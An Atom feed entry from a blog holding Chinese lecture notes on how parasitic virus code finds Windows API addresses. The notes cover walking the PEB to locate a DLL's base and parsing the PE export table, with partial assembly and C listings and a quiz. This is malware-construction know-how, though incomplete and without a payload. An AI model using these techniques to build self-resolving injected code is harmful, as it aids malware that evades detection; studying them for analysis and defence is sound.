<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>江湖</title>
  
  <subtitle>有人的地方就有江湖</subtitle>
  <link href="https://wsw8.online/atom.xml" rel="self"/>
  
  <link href="https://wsw8.online/"/>
  <updated>2021-05-19T13:19:51.257Z</updated>
  <id>https://wsw8.online/</id>
  
  <author>
    <name>汪道之</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>病毒_Win_DLL+导出表</title>
    <link href="https://wsw8.online/archives/227443dc.html"/>
    <id>https://wsw8.online/archives/227443dc.html</id>
    <published>2021-05-19T10:08:13.000Z</published>
    <updated>2021-05-19T13:19:51.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如何让病毒调用系统的api函数"><a class="markdownIt-Anchor" href="#如何让病毒调用系统的api函数"></a> 如何让病毒调用系统的API函数</h2><h3 id="如何获取api的入口地址"><a class="markdownIt-Anchor" href="#如何获取api的入口地址"></a> 如何获取API的入口地址</h3><ol><li>找到提供这个API函数的DLL的加载基址</li><li>从DLL的导出表中拿到API函数地址</li></ol><span id="more"></span><blockquote><p>DLL导出表机制：</p><p>在这个表中根据函数名找到函数入口地址</p></blockquote><p>一个简单方法：</p><blockquote><p>原理：一个系统中，所有进程加载的同一个DLL的加载基址是相同的</p></blockquote><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519193440959.png" alt="image-20210519193440959" /></p><p>病毒代码的处理：</p><ol><li><p>在病毒的数据区添加3个字段，分别存储MessageBox的地址（4字节）、函数参数“test”（5字节，留一个字节给结尾‘\0’字节）和“hello”（6字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">      ;MessageBox Entry <span class="number">4</span> bytes，偏移为<span class="number">13</span>字节（之前数据区<span class="number">13</span>字节）</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">;hello串，要留一个字节给结尾<span class="number">0</span>字节，共<span class="number">6</span>字节，偏移为<span class="number">17</span>字节</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">;test串，要留一个字节给结尾<span class="number">0</span>字节，偏移为<span class="number">23</span>字节</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br></pre></td></tr></table></figure></li><li><p>获取MessageBox的地址，将函数地址和函数参数填入数据区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填写MessageBox的入口地址</span></span><br><span class="line"><span class="comment">//该数据在数据区偏移13字节处</span></span><br><span class="line">*(<span class="keyword">void</span> **)(virusData + <span class="number">13</span>) = MessageBox;</span><br><span class="line"><span class="comment">//填写参数，hello字符串</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">17</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="comment">//填写参数，test字符串</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">23</span>, <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>在真正寄生的病毒代码中调用MessageBox函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">call yy;</span><br><span class="line">数据区;</span><br><span class="line">yy: pop eax; <span class="comment">//eax为数据区的实际起始内存地址</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">//调用MessageBox</span></span><br><span class="line">push <span class="number">0</span>; <span class="comment">//传递最后一个参数</span></span><br><span class="line">mov ebx, eax;  <span class="comment">//ebx指向数据区起始内存地址</span></span><br><span class="line">add ebx, <span class="number">23</span>; <span class="comment">//ebx指向test串</span></span><br><span class="line">push ebx;   <span class="comment">//压栈，传参test</span></span><br><span class="line">sub ebx, <span class="number">6</span>; <span class="comment">//hello串在test串前6个字节</span></span><br><span class="line">push ebx;  <span class="comment">//压栈,传参hello串</span></span><br><span class="line">push <span class="number">0</span>;   <span class="comment">//传递最后一个参数</span></span><br><span class="line">add eax, <span class="number">13</span>;  <span class="comment">//MessageBox地址在数据区偏移13个字节处</span></span><br><span class="line">mov eax, [eax]; <span class="comment">//获取MessageBox的地址</span></span><br><span class="line">call eax;  <span class="comment">//调用MessageBox函数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure></li></ol><h3 id="如何判断是否是控制台程序"><a class="markdownIt-Anchor" href="#如何判断是否是控制台程序"></a> 如何判断是否是控制台程序</h3><p>在PE文件可选映像头中，字段subsystem描述了该属性</p><p>Windows GUI和Windows CUI （G——Graphic，C——Console）</p><h2 id="病毒真正获取api函数地址的方法"><a class="markdownIt-Anchor" href="#病毒真正获取api函数地址的方法"></a> 病毒真正获取API函数地址的方法</h2><h3 id="获取dll基址"><a class="markdownIt-Anchor" href="#获取dll基址"></a> 获取DLL基址</h3><ol><li>FS寄存器在偏移0x30处保存了一个指针，指向PEB结构</li><li>PEB结构的偏移0x0c处保存了另外一个指针，指向PEB_LDR_DATA结构</li><li>PEB_LDR_DATA偏移0c处是加载模块链表的头指针，8个字节，头4个字节指向LDR_MODULE结构体（代表一个模块，每个模块都对应一个这样的结构体），后4个字节指向下一个结构体组成链表，该链表是循环链表</li><li>LDR_MODULE偏移0x2c有个成员BaseDllName，8个字节，后4个字节为地址，指向纯模块名的unicode串</li></ol><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//s1为要查找的DLL名，不包含结束符，Unicode码，一个字符占2个字节，所以是push 18</span></span><br><span class="line"><span class="comment">//相关代码在win7下可用 </span></span><br><span class="line">OLECHAR * s1 = <span class="string">L&quot;ntdll.dll&quot;</span>;</span><br><span class="line">    _asm&#123;</span><br><span class="line">       push <span class="number">18</span>      <span class="comment">//传参，字符串长度</span></span><br><span class="line">       push s1      <span class="comment">//传参，DLL名字</span></span><br><span class="line">       call finddll  <span class="comment">//调用函数finddll</span></span><br><span class="line">       jmp end</span><br><span class="line">       finddll:      <span class="comment">//finddll函数：找到DLL，返回eax为基址；否则为0</span></span><br><span class="line">       ……</span><br><span class="line">       end:</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * p;</span><br><span class="line">_asm mov p, eax</span><br><span class="line">wprintf(L“the dll %s base is %x\n”, s1, p);  <span class="comment">//打印DLL基址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">finddll:   ;参数<span class="number">1</span>为DLL的名字，参数<span class="number">2</span>位DLL长度，返回EAX为DLL基址或<span class="number">0</span>（未找到）</span><br><span class="line">   mov  ebx, fs:[<span class="number">30</span>h]      ;定位PEB</span><br><span class="line">   mov  ebx, [ebx+<span class="number">0</span>ch];定位PEB_LDR</span><br><span class="line">   mov  ebx, [ebx+<span class="number">0</span>ch];定位第一个模块（MODULE）</span><br><span class="line">   push ebx ;保存第一个模块地址到栈上</span><br><span class="line">loop_finddll:</span><br><span class="line">   push [esp + <span class="number">12</span>]  ;把DLL长度传参</span><br><span class="line">   push [esp + <span class="number">12</span>]  ;把DLL名字传参</span><br><span class="line">   push [ebx + <span class="number">30</span>h] ;传参<span class="keyword">module</span>的BaseName</span><br><span class="line">   call strcompare ;比较BaseName和s1是否相等</span><br><span class="line">   test eax,eax ;返回eax，<span class="number">0</span>为假，<span class="number">1</span>为真</span><br><span class="line">   jnz found ;找到跳转，未找到继续遍历</span><br><span class="line">   mov ebx,[ebx];模块头<span class="number">4</span>个字节指向下一个模块</span><br><span class="line">   mov eax,[ebx];指向当前模块的下下个模块</span><br><span class="line">   cmp [esp],eax;判断下下个模块是否是头模块</span><br><span class="line">   jz not_found ;遍历完说明没找到DLL  </span><br><span class="line">   jmp loop_finddll ;没遍历完，继续查找下一个模块</span><br><span class="line">found:</span><br><span class="line">   mov eax,[ebx+<span class="number">18</span>h];找到了，在模块偏移<span class="number">18</span>拿基地址，放eax</span><br><span class="line">   jmp finddll_end</span><br><span class="line">not_found:</span><br><span class="line">   <span class="keyword">xor</span> eax, eax ;没找到DLL，finddll函数返回eax为<span class="number">0</span></span><br><span class="line">finddll_end:</span><br><span class="line">   pop ebx ;平衡栈</span><br><span class="line">   ret <span class="number">8</span> ;平衡栈</span><br><span class="line"></span><br><span class="line">       strcompare: ;参数<span class="number">1</span> 字符串<span class="number">1</span>, 参数<span class="number">2</span> 字符串<span class="number">2</span>, 参数<span class="number">3</span> 字符串长度</span><br><span class="line">            ;返回eax，为<span class="number">0</span>表示不相等，为<span class="number">1</span>表示相等</span><br><span class="line">   push esi</span><br><span class="line">   push edi</span><br><span class="line">   push ecx</span><br><span class="line">   mov esi, [esp + <span class="number">16</span>]  ;获得参数<span class="number">1</span></span><br><span class="line">   mov edi, [esp + <span class="number">20</span>]  ;获得参数<span class="number">2</span></span><br><span class="line">   mov ecx, [esp + <span class="number">24</span>]  ;获得参数<span class="number">3</span></span><br><span class="line">   <span class="keyword">xor</span> eax, eax  ;返回值eax设初值<span class="number">0</span></span><br><span class="line">   cld        ;设置比较方向为地址增长方向</span><br><span class="line">   repz cmpsb        ;如果ecx为<span class="number">0</span>或比较的字节不相同则退出循环</span><br><span class="line">   test ecx,ecx</span><br><span class="line">   jnz strnotequ     ;如果ecx不为<span class="number">0</span>，说明比较字符不等，没比较完嘛</span><br><span class="line">   inc eax    ;找到了，设置返回值eax为<span class="number">1</span>，否则，不执行本语句，为<span class="number">0</span></span><br><span class="line"></span><br><span class="line">strnotequ:   </span><br><span class="line">   pop ecx</span><br><span class="line">   pop edi</span><br><span class="line">   pop esi</span><br><span class="line">   ret <span class="number">0</span>ch    ;平衡栈，传递了<span class="number">3</span>个参数</span><br></pre></td></tr></table></figure><h3 id="获取dll中的函数地址"><a class="markdownIt-Anchor" href="#获取dll中的函数地址"></a> 获取DLL中的函数地址</h3><p>DLL对外暴露自己的函数的方式：</p><ol><li>函数名</li><li>序号</li></ol><blockquote><p>注：函数名和序号并非一一对应</p></blockquote><h4 id="序号查找"><a class="markdownIt-Anchor" href="#序号查找"></a> 序号查找</h4><p>好处：快、高效</p><p>不足：不够直观，不够稳定</p><p>做法：用一个数组存放函数的入口地址，这样存放和读取都方便，从n开始就做一个减法</p><h4 id="函数名查找"><a class="markdownIt-Anchor" href="#函数名查找"></a> 函数名查找</h4><p>好处：直观，具体</p><p>做法：让函数名表和函数地址表的索引一一对应</p><p>不足：有的函数名不暴露出来，会导致函数名表和函数地址表的索引不一致</p><p>解决方法：增加一个表描述对应关系，如图</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519203923430.png" alt="image-20210519203923430" /></p><h3 id="导出表的关键信息汇总"><a class="markdownIt-Anchor" href="#导出表的关键信息汇总"></a> 导出表的关键信息汇总</h3><ol><li>序号查找需要知道序号的最小值n，利用他可以直接计算函数地址表的索引</li><li>函数名表：函数名的字串表，每个名字以\0结尾</li><li>函数名表的元素个数X</li><li>函数地址索引表：元素个数就是函数名表的个数X，函数名表的第x项对应函数地址索引表的x项，其中存储的是该函数在函数地址表中的索引值</li><li>由函数名查找的方法是：找到函数名在函数名表的索引x，然后读函数地址索引表的第x项，假设该项的值为y，那么就在函数地址表的第y项拿到函数地址</li><li>函数地址表：存储的是函数的入口地址，不论用序号还是名字导出的函数，相应的函数地址都存在其中，函数地址表是按序号增序排列。序号和函数地址表索引的对应关系是：i = 序号 - n（最小序号）</li></ol><h3 id="pe格式中导出表的信息"><a class="markdownIt-Anchor" href="#pe格式中导出表的信息"></a> PE格式中导出表的信息</h3><p>在模块可选头中有个数据目录表，其中每项包括导出表、导入表、重定位表等；在导出表头中有如下信息：</p><ol><li>Address Table RVA就是函数地址表的RVA</li><li>Ordinal Table RVA就是函数地址索引表的RVA，PE格式叫它序号表</li><li>Ordinal Base就是最小的序号</li><li>Number of names就是函数名表的条数</li><li>Name Pointer Table RVA是函数名指针表，每项4个字节，存放一个RVA，指向一个函数名的字符串</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519205042946.png" alt="image-20210519205042946" /></p><h3 id="导出函数查找算法总结"><a class="markdownIt-Anchor" href="#导出函数查找算法总结"></a> 导出函数查找算法总结</h3><ol><li><p>从DLL加载的实际基址获取可选头，从其中数据目录表的第一项找到导出表入口RVA</p></li><li><p>从导出表的表头获取Number of names，即查找的最大循环次数</p></li><li><p>循环遍历函数名指针表，比对每项RVA指向的字串是否为要找的函数名</p></li><li><p>如果找到，记下此时函数名指针表项的索引，设为 i</p></li><li><p>根据索引 i，在序号表中找到对应项，获取其内容为n</p></li><li><p>以n为索引在函数地址表中找到函数入口的RVA，加上DLL的实际基址即为函数的实际入口地址</p></li><li><blockquote><p>注：以上算法中，所有访问实际地址的地方，就用DLL的实际加载基址+RVA即可</p></blockquote></li></ol><h3 id="程序设计查找dll中的函数地址"><a class="markdownIt-Anchor" href="#程序设计查找dll中的函数地址"></a> 程序设计——查找DLL中的函数地址</h3><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为各个所需的偏移量定义宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NTHDR_START_IN_DOSHDR 0x3c  <span class="comment">//DOS头偏移0x3c为NT头的偏移</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NTHDR_EXPORT_DIR 0x78  <span class="comment">//NT头偏移0x78为导出表的RVA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NAME_NUM_EXPORT 0X18   <span class="comment">//导出表偏移0x18为函数名的数量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NAME_PTR_EXPORT 0X20   <span class="comment">//导出表偏移0x20为函数名指针表RVA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_ORDINAL_EXPORT 0X24    <span class="comment">//导出表偏移0x24为序号表RVA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_PROC_PTR_EXPORT 0x1c   <span class="comment">//导出表偏移0x1C为函数地址表RVA</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数需要3个参数，DLL基址，函数名，函数名长度，注意传参是从右向左压栈</span></span><br><span class="line">__declspec(naked) _stdcall <span class="keyword">unsigned</span> <span class="keyword">long</span> </span><br><span class="line">           getProcEntry(<span class="keyword">char</span> * base, <span class="keyword">char</span> * procName, <span class="keyword">int</span> procNameLen) &#123; </span><br><span class="line">  _asm</span><br><span class="line"> &#123;</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line">    mov edi, [ebp + <span class="number">8</span>]; <span class="comment">//edi存放DLL基址（base）</span></span><br><span class="line">    mov ebx, edi         </span><br><span class="line">    add ebx, OFFSET_NTHDR_START_IN_DOSHDR; <span class="comment">//ebx: DOS头的e_lfanew字段内存地址（base+0x3C）</span></span><br><span class="line">    mov ebx, [ebx];<span class="comment">//ebx: NT头的RVA的值</span></span><br><span class="line">    add ebx, edi;             <span class="comment">//ebx: NT头的内存地址（RVA + base）</span></span><br><span class="line">    </span><br><span class="line">    add ebx, OFFSET_NTHDR_EXPORT_DIR  <span class="comment">//ebx: 导出表RVA字段的内存地址</span></span><br><span class="line">    mov ebx, [ebx];<span class="comment">//ebx: 导出表的RVA值</span></span><br><span class="line">    add ebx, edi;<span class="comment">//ebx: 导出表的内存地址（RVA + base）</span></span><br><span class="line">    </span><br><span class="line">    mov ecx, ebx;<span class="comment">//ecx: 导出表内存地址</span></span><br><span class="line">    add ecx, OFFSET_NAME_NUM_EXPORT <span class="comment">//ecx: 导出表中函数名数目字段的内存地址</span></span><br><span class="line">    mov ecx, [ecx];  <span class="comment">//ecx: 函数名数目的值，即设置好了循环次数</span></span><br><span class="line">    </span><br><span class="line">    mov edx, ebx;    <span class="comment">//edx: 导出表内存地址</span></span><br><span class="line">    add edx, OFFSET_NAME_PTR_EXPORT  <span class="comment">//edx: 函数名指针表RVA字段的内存地址</span></span><br><span class="line">    mov edx, [edx];           <span class="comment">//edx: 函数名指针表RVA的值</span></span><br><span class="line">    add edx, edi;             <span class="comment">//edx: 函数名指针表的内存地址（RVA+base）</span></span><br><span class="line"></span><br><span class="line">    push <span class="number">0</span>;       <span class="comment">//找到函数名，就放其在函数名指针表的索引i，初始为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下循环比较函数名字符串</span></span><br><span class="line">;<span class="comment">//ebx 导出表内存地址 ecx 函数名数目的值 edx 函数名指针表内存地址 edi DLL基址</span></span><br><span class="line"></span><br><span class="line">find_proc_loop:</span><br><span class="line">    mov esi, [edx]; <span class="comment">//esi: 获得函数名指标表当前项的值，即函数名字符串的RVA的值</span></span><br><span class="line">    add esi, edi;   <span class="comment">//esi: 获得函数名字符串的内存地址</span></span><br><span class="line">    ;<span class="comment">//传参，调用我们之前写的strcompare函数</span></span><br><span class="line">    ;<span class="comment">//第1和第2个参数为两个字符串，第3个参数为字符串长度，参数从右往左传</span></span><br><span class="line">    push [ebp + <span class="number">10</span>h];    <span class="comment">//压栈字符串长度</span></span><br><span class="line">    push esi;       <span class="comment">//压栈字符串2，函数名指针表项指向的字符串</span></span><br><span class="line">    push [ebp + <span class="number">0</span>ch];   <span class="comment">//压栈字符串1，需要查找的函数名</span></span><br><span class="line">    call strcompare       <span class="comment">//字符串比较，调用完后清栈</span></span><br><span class="line">    test eax, eax         <span class="comment">//字符串比较结果，相等eax为1</span></span><br><span class="line">    jnz find_proc_found   <span class="comment">//找到了，跳转</span></span><br><span class="line">    add edx, <span class="number">4</span>            <span class="comment">//没找到，edx指向下一个函数名指针表的表项</span></span><br><span class="line">    mov eax, [esp]        <span class="comment">//调用完strcmp后，esp指向之前的push 0，所以[esp]是循环值i</span></span><br><span class="line">    inc eax      <span class="comment">//i++</span></span><br><span class="line">    mov [esp], eax         <span class="comment">//继续在esp存循环变量的值，也是当前项的索引</span></span><br><span class="line">    dec ecx;         <span class="comment">//循环次数减1</span></span><br><span class="line">    jnz find_proc_loop <span class="comment">//ecx不为0，继续遍历</span></span><br><span class="line">    pop eax;   <span class="comment">//没找到，清除栈内i，平衡栈</span></span><br><span class="line">    <span class="keyword">xor</span> eax, eax; <span class="comment">//eax置0，表示未找到</span></span><br><span class="line">    jmp find_proc_end</span><br><span class="line">find_proc_found</span><br><span class="line">     ……</span><br><span class="line">find_proc_end</span><br><span class="line">     …… <span class="comment">//平衡栈的相关操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下为找到字符串后获取函数地址</span></span><br><span class="line">;<span class="comment">//eax 所查找函数名在函数名指针表的索引i </span></span><br><span class="line">;<span class="comment">//ebx 导出表内存地址</span></span><br><span class="line">;<span class="comment">//edi DLL基址</span></span><br><span class="line"></span><br><span class="line">find_proc_found:</span><br><span class="line">  pop eax;  <span class="comment">//获得函数名指针表的索引</span></span><br><span class="line">  </span><br><span class="line">  mov edx, ebx;    <span class="comment">//edx: 导出表内存地址</span></span><br><span class="line">  add edx, OFFSET_ORDINAL_EXPORT;  <span class="comment">//edx: 序号表RVA字段的内存地址</span></span><br><span class="line">  mov edx, [edx];<span class="comment">//edx: 序号表RVA的值</span></span><br><span class="line">  add edx, edi;          <span class="comment">//edx: 序号表的内存地址（RVA + base）</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//序号表每项2字节，第i项为eax * 2,lea指令将该项的地址放入edx</span></span><br><span class="line">  lea edx, [edx + eax * <span class="number">2</span>]; </span><br><span class="line">  <span class="keyword">xor</span> eax, eax</span><br><span class="line">  mov ax, [edx];     <span class="comment">//eax: 序号表中对应项的值，即为函数地址表的索引值,注意只放2字节</span></span><br><span class="line">  </span><br><span class="line">  mov edx, ebx; <span class="comment">//edx: 导出表内存地址</span></span><br><span class="line">  add edx, OFFSET_PROC_PTR_EXPORT;  <span class="comment">//ebx: 函数地址表RVA字段的内存地址</span></span><br><span class="line">  mov edx, [edx];       <span class="comment">//ebx: 函数地址表的RVA的值</span></span><br><span class="line">  add edx, edi;       <span class="comment">//ebx: 函数地址表的内存地址（RVA + base）</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//函数地址表每项4字节，eax为函数地址表的索引值，获得对应项的地址</span></span><br><span class="line">  lea eax, [edx + eax * <span class="number">4</span>];  </span><br><span class="line">  mov eax, [eax];   <span class="comment">//eax: 函数地址表中对应项的值，即为函数入口RVA的值</span></span><br><span class="line">  add eax, edi;     <span class="comment">//eax: 所查找函数的内存地址（RVA + base）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Main函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   OLECHAR * s1 = L“USER32.dll”;   <span class="comment">//DLL名字</span></span><br><span class="line">   <span class="keyword">void</span> * p = MessageBox;         <span class="comment">//函数名字</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> base;         <span class="comment">//DLL基址</span></span><br><span class="line">   <span class="comment">//将前面写的获取DLL基址的汇编代码封装成函数，传参分别是DLL名字和DLL名字的长度</span></span><br><span class="line">   <span class="comment">//注意名字长度为Unicode码，一个字符占2个字节</span></span><br><span class="line">   base = getDllBaseW((<span class="keyword">char</span> *)s1, <span class="number">20</span>);  </span><br><span class="line">   <span class="built_in">printf</span>(“user32.dll base address is %x\n”, base); <span class="comment">//打印获得的DLL基址</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;messagebox address is %x\n&quot;</span>, </span><br><span class="line">        getProcEntry((<span class="keyword">char</span> *)base, “ActivateKeyboardLayout”, <span class="number">22</span>)); <span class="comment">//打印函数地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将finddll和getproc函数放入寄生的病毒代码"><a class="markdownIt-Anchor" href="#将finddll和getproc函数放入寄生的病毒代码"></a> 将finddll和getproc函数放入寄生的病毒代码</h3><p>数据区改进：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519211017574.png" alt="image-20210519211017574" /></p><p>增加的代码是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填写user32.dll的unicode串</span></span><br><span class="line">OLECHAR * s1 = L“USER32.dll”;  <span class="comment">//unicode码</span></span><br><span class="line"><span class="comment">//user32.dll放到寄生代码数据区偏移24字节处</span></span><br><span class="line"><span class="built_in">memcpy</span>(virusData + <span class="number">24</span>, s1, <span class="number">20</span>);</span><br><span class="line"><span class="comment">//MessageBoxA放到寄生代码数据区偏移44字节处</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">44</span>, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br></pre></td></tr></table></figure><p>程序设计图：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519211156523.png" alt="image-20210519211156523" /></p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2><ol><li>关于导出表的说法，以下正确的是（     ）<br />A. 函数地址表中存放的是函数入口VA（RVA）<br />B. 导入表中具有函数名表，通过函数名表的索引直接就可以定位到函数地址表中相应的项<br />C. DLL中所有的函数都有函数名和序号<br />D. 序号表中存储的是函数的序号<br />E. 以上都不正确</li></ol><p>参考答案：E</p><p>解析：</p><p>A. 函数地址表中存的是函数的入口地址；</p><p>B. 通过函数名表索引定位函数地址索引表索引，再根据函数地址索引表内容定位函数地址表的索引；</p><p>C. 有的函数名不暴露；</p><p>D. 序号表存的是函数名表和函数地址表的对应关系</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;如何让病毒调用系统的api函数&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#如何让病毒调用系统的api函数&quot;&gt;&lt;/a&gt; 如何让病毒调用系统的API函数&lt;/h2&gt;
